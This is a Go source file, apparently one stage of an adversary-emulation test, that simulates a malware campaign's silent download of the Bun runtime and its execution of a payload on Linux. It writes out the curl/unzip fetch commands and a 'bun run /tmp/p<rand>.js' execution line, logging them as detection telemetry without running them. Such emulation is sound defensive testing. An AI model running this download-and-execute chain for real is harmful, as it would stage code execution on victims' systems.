//go:build linux
// +build linux

/*
STAGE 3: JS Runtime Acquisition (Bun) — Stubbed (T1105, T1059.004)
Simulates the campaign behavior where, if Bun is not installed, the payload
silently downloads and extracts the Bun runtime to a temp dir and uses it to
execute the decrypted payload:
    curl -sSL "https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-<os>-<arch>.zip" -o b.zip
    unzip -j -o b.zip -d /tmp/b-<rand>/

SAFETY: This stage performs NO network activity whatsoever. The curl/unzip command
lines are constructed and LOGGED as detection telemetry, a placeholder marker file
is written under /tmp/F0 to stand in for the runtime, and the "execute payload with
bun" step is logged only. Nothing is downloaded or executed.
*/

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

const (
	TEST_UUID      = "ae9002e4-3d82-4fcd-8b45-f7e0628f7375"
	TECHNIQUE_ID   = "T1105"
	TECHNIQUE_NAME = "JS Runtime Acquisition (Bun) - Stubbed"
	STAGE_ID       = 3

	BUN_VERSION = "bun-v1.3.13"
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "stubbed Bun runtime acquisition (no real download)")

	if err := performTechnique(); err != nil {
		if isBlockedError(err) {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("%s executed successfully", TECHNIQUE_NAME))
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Runtime acquisition staging simulated (no download performed)")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	stageDir := filepath.Join("/tmp/F0", fmt.Sprintf("b-%d", time.Now().UnixNano()%1000000))
	if err := os.MkdirAll(stageDir, 0755); err != nil {
		return fmt.Errorf("failed to create runtime staging directory: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Created Bun staging directory: %s", stageDir))

	// Phase 1: Detect whether Bun is already present (read-only PATH probe).
	fmt.Printf("[STAGE %s] Phase 1: Probing for existing Bun runtime...\n", TECHNIQUE_ID)
	bunPresent := bunOnPath()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Existing Bun on PATH: %v", bunPresent))

	// Phase 2: Construct the download/extract command lines (LOGGED, NOT RUN).
	osTag, archTag := bunPlatformTags()
	url := fmt.Sprintf("https://github.com/oven-sh/bun/releases/download/%s/bun-%s-%s.zip", BUN_VERSION, osTag, archTag)
	zipPath := filepath.Join(stageDir, "b.zip")
	curlCmd := fmt.Sprintf("curl -sSL %q -o %q", url, zipPath)
	unzipCmd := fmt.Sprintf("unzip -j -o %q -d %q", zipPath, stageDir)

	fmt.Printf("[STAGE %s] Phase 2: Would acquire Bun runtime (SIMULATED, no network):\n", TECHNIQUE_ID)
	fmt.Printf("[STAGE %s]   %s\n", TECHNIQUE_ID, curlCmd)
	fmt.Printf("[STAGE %s]   %s\n", TECHNIQUE_ID, unzipCmd)
	LogMessage("INFO", TECHNIQUE_ID, "SIMULATED ingress tool transfer (no request issued): "+curlCmd)
	LogMessage("INFO", TECHNIQUE_ID, "SIMULATED archive extraction (no archive present): "+unzipCmd)

	// Phase 3: Write a placeholder marker standing in for the extracted runtime.
	fmt.Printf("[STAGE %s] Phase 3: Writing placeholder runtime marker (stand-in for ./bun)...\n", TECHNIQUE_ID)
	bunMarker := filepath.Join(stageDir, "bun")
	marker := "#!/bin/sh\n# F0RT1KA SIMULATION placeholder for the Bun runtime.\n" +
		"# In the real campaign this would be the downloaded Bun binary used to run\n" +
		"# the decrypted payload: bun run /tmp/p<rand>.js\n" +
		"echo 'F0RT1KA simulation: bun placeholder (no real runtime acquired)'\n"
	if err := os.WriteFile(bunMarker, []byte(marker), 0755); err != nil {
		return fmt.Errorf("failed to write runtime placeholder: %v", err)
	}
	LogFileDropped("bun", bunMarker, int64(len(marker)), false)

	// Phase 4: Log the "execute payload with bun" step (NOT executed).
	fmt.Printf("[STAGE %s] Phase 4: Would execute: bun run /tmp/p<rand>.js (SIMULATED ONLY)\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "SIMULATED payload execution via acquired runtime: bun run /tmp/p<rand>.js (not executed)")

	// Record an acquisition manifest for forensic review.
	manifest := strings.Join([]string{
		"=== Bun Runtime Acquisition (SIMULATED - no network performed) ===",
		"requested_version: " + BUN_VERSION,
		"download_url: " + url,
		"curl_command: " + curlCmd,
		"unzip_command: " + unzipCmd,
		fmt.Sprintf("existing_bun_on_path: %v", bunPresent),
		"network_performed: false",
		"runtime_executed: false",
		"",
	}, "\n")
	manifestPath := filepath.Join(stageDir, "acquisition_manifest.txt")
	if err := os.WriteFile(manifestPath, []byte(manifest), 0644); err != nil {
		return fmt.Errorf("failed to write acquisition manifest: %v", err)
	}
	LogFileDropped("acquisition_manifest.txt", manifestPath, int64(len(manifest)), false)

	fmt.Printf("[STAGE %s] Runtime acquisition staging complete (no download, no execution).\n", TECHNIQUE_ID)
	return nil
}

func bunOnPath() bool {
	for _, dir := range strings.Split(os.Getenv("PATH"), ":") {
		if dir == "" {
			continue
		}
		if _, err := os.Stat(filepath.Join(dir, "bun")); err == nil {
			return true
		}
	}
	return false
}

func bunPlatformTags() (string, string) {
	osTag := "linux"
	if runtime.GOOS == "darwin" {
		osTag = "darwin"
	}
	archTag := "x64"
	if runtime.GOARCH == "arm64" {
		archTag = "aarch64"
	}
	return osTag, archTag
}

func isBlockedError(err error) bool {
	errStr := strings.ToLower(err.Error())
	blockedPatterns := []string{
		"quarantined", "blocked by security", "blocked by endpoint",
		"malware detected", "threat detected", "security policy",
	}
	for _, pattern := range blockedPatterns {
		if strings.Contains(errStr, pattern) {
			return true
		}
	}
	return false
}
